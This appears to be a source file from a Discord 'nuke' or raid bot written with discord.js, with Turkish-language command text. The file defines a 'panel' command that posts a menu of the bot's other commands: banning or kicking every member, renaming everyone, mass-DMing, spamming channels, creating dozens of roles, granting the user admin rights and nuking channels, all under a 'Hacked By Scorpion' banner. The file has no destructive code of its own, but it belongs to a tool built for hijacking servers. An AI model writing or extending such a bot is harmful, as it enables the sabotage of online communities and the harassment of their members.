const { EmbedBuilder } = require("discord.js");

module.exports = {
  name: "panel",
  description: "Sistemi yöneteceğin ana komuta merkezini açar.",
  async execute(message, args, client, config) {
    await message.delete().catch(() => { });

    const embed = new EmbedBuilder()
      .setTitle("👑 SCORPION MERKEZ KOMUTA SİSTEMİ 👑")
      .setDescription(`Protokol Öneki: **${config.prefix}**\n\nBu panel yalnızca mutlak hakimin gözleri içindir. Kusursuz çalışır.`)
      .setColor(0x6b0000)
      .setImage("https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExMjM0NTY3ODkwMTIzNDU2Nzg5MDEyMzQ1Njc4OTAxMjM0NTY3ODkwMSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/3o7TKSjRrfIPjeiVyM/giphy.gif")
      .addFields(
        { name: `${config.prefix}patlat`, value: "Sunucuyu Scorpion'un krallığına çevirir", inline: false },
        { name: `${config.prefix}ban`, value: "Tüm üyeleri banlar", inline: true },
        { name: `${config.prefix}kick`, value: "Tüm üyeleri atar", inline: true },
        { name: `${config.prefix}isimler`, value: "Herkesin adını değiştirir", inline: true },
        { name: `${config.prefix}dm <mesaj>`, value: "Herkese DM gönderir", inline: false },
        { name: `${config.prefix}spam [mesaj]`, value: "Kanala 100x spam atar", inline: true },
        { name: `${config.prefix}rol`, value: "50 adet kan kırmızı rol açar", inline: true },
        { name: `${config.prefix}yetki`, value: "Sana yetki rolü verir", inline: true },
        { name: `${config.prefix}ayril`, value: "Botu sunucudan atar", inline: true },
        { name: `${config.prefix}nuke`, value: "Kanalları nuke'lar", inline: false },
        { name: `${config.prefix}silici`, value: "İfadeleri siler", inline: true },
        { name: `${config.prefix}kilit`, value: "Sistemi kilitler", inline: true }
      )
      .setFooter({ text: "Sistem Hacked By Scorpion • Boyun Eğ!" })
      .setTimestamp();

    await message.channel.send({ embeds: [embed] }).catch(() => { });
  },
};
